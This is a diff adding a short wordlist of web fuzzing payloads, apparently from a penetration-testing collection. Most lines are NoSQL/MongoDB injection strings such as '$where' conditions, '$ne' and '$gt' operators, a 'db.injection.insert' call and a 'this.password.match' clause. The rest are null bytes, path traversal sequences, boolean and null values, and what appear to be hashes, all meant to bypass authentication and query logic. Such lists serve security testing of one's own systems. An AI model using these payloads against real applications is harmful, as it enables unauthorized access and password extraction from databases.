@@ -1,0 +1,36 @@
+TRUE
+FALSE
+success
+%00
+1
+0
+-1
+"1"
+"0"
+"-1"
+NULL
+array()
+""
+php
+../
+..
+undefined
+NONE
+b326b5062b2f0e69046810717534cb09
+68934a3e9455fa72420237eb05902327
+0dbbdee11aef042394754c0375d6e074
+5e543256c480ac577d30f76f9120eb74
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+|| 1==1
+' && this.password.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+{$gt: ''}
+[$ne]=1
